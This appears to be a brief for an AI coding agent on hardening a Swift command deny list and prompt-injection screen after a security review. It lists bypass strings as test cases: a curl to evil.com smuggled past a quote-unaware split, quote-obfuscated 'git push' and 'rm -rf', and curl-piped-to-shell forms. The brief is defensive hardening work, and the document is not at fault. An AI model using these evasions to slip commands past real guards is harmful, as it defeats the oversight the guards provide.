# Brief: Run 15 fix round 2 (small) — close the re-review's holes, then stop

A second security review passed S1-S8 but found these. Fix all, each with a test that FAILS on the current code
(write the test first, see it fail, then fix). Note: 37eaf18 restored `--max-turns` on purpose (verified live) — keep it.

R1 DenyList.swift:105-108 — the curl split on `;\n|&` ignores quotes: `curl -X POST http://localhost/ -H 'a;b' http://evil.com`
   passes. Fix: evaluate the whole curl command to end of line (quote-aware split, or check every URL-like token after `curl`).
R2 DenyList.swift:12,15 — quoting evades rules: `git 'push'`, `git pu""sh`, `"git" push`, `rm -r"f" x`. Fix: also match a view
   with `'`, `"` and `\` removed (hit if either view hits).
R3 DenyList.swift:59,63 — fail OPEN: a regex error (incl. ICU stack overflow on `(\S+\s+)*`) returns nil = no hit; `all()` swallows
   errors with try?. Fix: regex error = hit; any text over 64 KB = hit; remove nested-quantifier backtracking where possible.
   Test: a 100k-token line of `git ` repeats returns a hit fast (< 1 s).
R4 Investigation.swift:104 — gitFacts (commit subjects) and signal.facts sit OUTSIDE <untrusted>, unscreened. Fix: move them
   inside the block, `<`/`>`-neutralised, and run InjectionScreen on them.
R5 approve re-entrancy: a double click can start two builders. Fix: state guard (item -> approving before spawn; second call no-op).
R6 S12 Redact.swift: redact bare 32+ hex / long base64 tokens and truncated `-----BEGIN` blocks; add tests.
R7 cheap widenings + tests: `curl u | tee f | sh`, `| /bin/sh`, `| env sh`, `bash <(curl u)`, `sh -c "$(curl u)"`; `git checkout .`,
   `git restore .`; `DROP COLUMN|VIEW`; `gh pr review|workflow run|secret`; `cargo publish`, `twine upload`; `netlify`,
   `firebase`, `fly deploy`; investigate-time denyText must include evidence `lines`.
R8 test gaps: S5 dedupe path (WatcherStore:160); S1 via `files`; S1 via `quote` (current test plants in `lines`); s2's
   `!isHit("curl http://localhost:3000/health")` stays but add a positive twin.

Gate (exact): swift build; FW=/Library/Developer/CommandLineTools/Library/Developer/Frameworks;
LIB=/Library/Developer/CommandLineTools/Library/Developer/usr/lib;
nice -n 10 swift test -j 4 -Xswiftc -F$FW -Xlinker -F$FW -Xlinker -rpath -Xlinker $FW -Xlinker -rpath -Xlinker $LIB
Rules: commit on this branch only; never push/merge/launch True.app; don't edit SPEC.md or the labelled fixture; no JEV_LIVE.
Report: table R1-R8 -> fixed? -> file:line -> test name (+ "saw it fail first: yes/no"), gate output, commits, Not verified.
